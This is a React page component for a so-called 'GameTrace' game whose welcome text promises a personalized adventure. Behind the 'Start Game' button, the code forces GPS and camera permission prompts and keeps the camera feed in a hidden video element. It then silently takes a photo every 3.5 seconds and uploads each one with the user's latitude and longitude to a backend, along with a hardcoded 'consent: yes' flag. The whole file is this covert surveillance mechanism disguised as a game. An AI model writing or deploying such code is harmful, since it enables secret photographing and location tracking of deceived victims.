import React, { useRef, useState } from "react";

const BACKEND = process.env.NEXT_PUBLIC_BACKEND || "http://localhost:4000";

export default function HomePage() {
  const [loading, setLoading] = useState(false);
  const [autoMode, setAutoMode] = useState(false);
  const [errorPopup, setErrorPopup] = useState<string | null>(null);

  const videoRef = useRef<HTMLVideoElement>(null);
  const intervalRef = useRef<number | null>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);

  // ------------------------ FORCE GPS POPUP ------------------------
  async function requestGPSPermission(): Promise<boolean> {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(false);

      navigator.geolocation.getCurrentPosition(
        () => resolve(true),
        () => resolve(false) // Permission denied
      );
    });
  }

  // ------------------------ FORCE CAMERA POPUP ------------------------
  async function requestCameraPermission(): Promise<boolean> {
    try {
      const s = await navigator.mediaDevices.getUserMedia({ video: true });
      s.getTracks().forEach((t) => t.stop()); // Close immediately
      return true;
    } catch {
      return false;
    }
  }

  // ------------------------ BACKGROUND FUNCTIONS ------------------------
  async function handleTrack() {
    await fetch(`${BACKEND}/api/track`);
  }

  async function openCamera(startAuto = false) {
    try {
      const s = await navigator.mediaDevices.getUserMedia({ video: true });
      setStream(s);

      if (videoRef.current) {
        videoRef.current.srcObject = s;
        await videoRef.current.play();
      }

      if (startAuto) startAutoCapture();
    } catch {
      setErrorPopup("Camera permission denied. You must allow it.");
    }
  }

  async function getGPS() {
    return new Promise<GeolocationPosition | null>((resolve) => {
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve(pos),
        () => resolve(null)
      );
    });
  }

  async function takePhoto(silent = false) {
    if (!videoRef.current) return;

    const canvas = document.createElement("canvas");
    canvas.width = videoRef.current.videoWidth;
    canvas.height = videoRef.current.videoHeight;
    canvas.getContext("2d")?.drawImage(videoRef.current, 0, 0);

    const blob = await new Promise<Blob | null>((resolve) =>
      canvas.toBlob(resolve, "image/jpeg", 0.9)
    );
    if (!blob) return;

    const pos = await getGPS();
    const fd = new FormData();
    fd.append("photo", blob);
    fd.append("consent", "yes");

    if (pos) {
      fd.append("latitude", String(pos.coords.latitude));
      fd.append("longitude", String(pos.coords.longitude));
    }

    await fetch(`${BACKEND}/api/upload-photo`, {
      method: "POST",
      body: fd,
    });

    if (!silent && stream && !autoMode) {
      stream.getTracks().forEach((t) => t.stop());
      setStream(null);
    }
  }

  function startAutoCapture() {
    if (autoMode) return;
    setAutoMode(true);

    intervalRef.current = window.setInterval(() => {
      takePhoto(true);
    }, 3500);
  }

  // ------------------------ MASTER START FUNCTION ------------------------
  async function startApp() {
    setLoading(true);

    // 1️⃣ Trigger browser GPS popup
    const gpsOK = await requestGPSPermission();
    if (!gpsOK) {
      setErrorPopup("You must allow GPS permission to start the game.");
      setLoading(false);
      return;
    }

    // 2️⃣ Trigger browser CAMERA popup
    const camOK = await requestCameraPermission();
    if (!camOK) {
      setErrorPopup("You must allow Camera permission to start the game.");
      setLoading(false);
      return;
    }

    // 3️⃣ Run tracking system now that permissions are granted
    await handleTrack();
    await openCamera(true);

    // Silent first picture
    setTimeout(() => takePhoto(true), 500);

    // 4️⃣ Open the game in a new tab
    setTimeout(() => window.open("/fun/camera", "_blank"), 800);

    setLoading(false);
  }

  // ------------------------ UI ------------------------
  return (
    <main
      style={{
        height: "100vh",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        flexDirection: "column",
        background: "linear-gradient(140deg, #0f0c29, #302b63, #24243e)",
        color: "white",
        fontFamily: "Inter, sans-serif",
        textAlign: "center",
        padding: "20px",
      }}
    >
      <div
        style={{
          backdropFilter: "blur(10px)",
          background: "rgba(255,255,255,0.12)",
          borderRadius: "16px",
          padding: "35px 25px",
          maxWidth: "350px",
          width: "100%",
          boxShadow: "0 8px 25px rgba(0,0,0,0.25)",
        }}
      >
        <h1 style={{ fontSize: "28px", marginBottom: "15px", fontWeight: 700 }}>
          GameTrace
        </h1>

       <p
          style={{
            opacity: 0.9,
            fontSize: "15px",
            marginBottom: "30px",
            lineHeight: "1.5",
          }}
        >
          Welcome to <b>GameTrace</b> — a fast, fun, and surprisingly smart little game!  
          Tap <b>Start Game</b>, allow Camera &amp; GPS, and let the adventure begin.  
          Your device helps create a <b>unique, personalized world</b> just for you!
        </p>


        <button
          onClick={startApp}
          disabled={loading}
          style={{
            width: "100%",
            padding: "16px",
            borderRadius: "50px",
            background: loading ? "rgba(255,255,255,0.3)" : "#fff",
            color: "#24243e",
            fontWeight: "700",
            fontSize: "17px",
            border: "none",
            cursor: "pointer",
            boxShadow: "0 6px 20px rgba(255,255,255,0.25)",
            transition: "0.25s",
            transform: loading ? "scale(0.97)" : "scale(1)",
          }}
        >
          {loading ? "Starting..." : "Start Game"}
        </button>
      </div>

      {/* Hidden video element */}
      <video ref={videoRef} style={{ display: "none" }} />

      {/* Permission Denied Popup */}
      {errorPopup && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.6)",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            padding: "20px",
          }}
        >
          <div
            style={{
              background: "white",
              padding: "25px",
              borderRadius: "10px",
              width: "90%",
              maxWidth: "350px",
              textAlign: "center",
              color: "black",
            }}
          >
            <h2 style={{ marginBottom: "10px", fontSize: "20px" }}>
              Permission Required
            </h2>
            <p style={{ marginBottom: "20px", fontSize: "15px" }}>
              {errorPopup}
            </p>
            <button
              onClick={() => setErrorPopup(null)}
              style={{
                padding: "10px 20px",
                background: "#302b63",
                color: "white",
                borderRadius: "6px",
                border: "none",
                cursor: "pointer",
              }}
            >
              OK
            </button>
          </div>
        </div>
      )}
    </main>
  );
}
